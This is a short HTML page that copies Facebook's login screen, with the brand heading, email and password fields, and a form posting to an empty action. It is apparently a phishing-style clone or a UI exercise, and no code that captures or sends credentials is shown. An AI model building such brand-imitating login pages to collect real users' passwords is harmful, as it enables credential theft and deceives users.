<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="./Pstyles/fbstyles.css">
</head>
<body>
    <div class="container">
        <h2>facebook</h2>
    </div>
    <div class="login">
        <div class="login__container">
            Log in to Facebook
        </div>
        <form action="" method="post">
            <input type="text" name="email" placeholder="Email address or Phone number" class="input" required>
            <input type="password" name="password" placeholder="Password" class="input" required>
            <button type="submit" class="btn">Log in</button>
        </form>
        <ul class="FClist">
            <li><a href="#" class="forgot">Forgotten account?</a></li>
            <li><a href="#" class="create">Sign up for Facebook</a></li>
        </ul>
    </div>
</body>
</html>
